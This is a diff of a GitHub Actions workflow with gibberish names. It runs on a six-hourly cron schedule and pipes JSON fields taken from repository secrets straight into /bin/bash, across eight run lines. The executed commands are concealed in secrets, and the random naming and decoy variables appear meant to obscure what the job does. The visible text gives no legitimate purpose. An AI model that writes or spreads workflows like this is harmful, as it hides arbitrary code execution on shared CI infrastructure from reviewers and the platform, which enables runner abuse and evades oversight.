@@ -1,25 +1,25 @@
 name: limiaozhen5421
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 5/6 * * *'
+    - cron: '12 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: limiaozhen5421
         env:
-          xv3916: ${{ secrets.xv3916 }}
+          if61295: ${{ secrets.if61295 }}
         run: |
-          echo $xv3916 | jq -r .ozg47 | /bin/bash
-          echo $tfpa25173 | jq -r .oboc27 | /bin/bash
-          echo $pash850 | jq -r .xtzy1 | /bin/bash
-          echo $domm1 | jq -r .mzu113 | /bin/bash
-          echo $k48345 | jq -r .no906 | /bin/bash
-          echo $p13 | jq -r .vu017 | /bin/bash
-          echo $ft89304 | jq -r .btg308 | /bin/bash
-          echo $xbx7750 | jq -r .dfdn92 | /bin/bash
+          echo $if61295 | jq -r .otrie51 | /bin/bash
+          echo $ulq02414 | jq -r .oalj325 | /bin/bash
+          echo $nrk47 | jq -r .y361 | /bin/bash
+          echo $qqy63 | jq -r .lrp740 | /bin/bash
+          echo $polfg16778 | jq -r .x63 | /bin/bash
+          echo $xs1656 | jq -r .dsjhz288 | /bin/bash
+          echo $idgp3593 | jq -r .q5 | /bin/bash
+          echo $txkr71077 | jq -r .od73 | /bin/bash
 
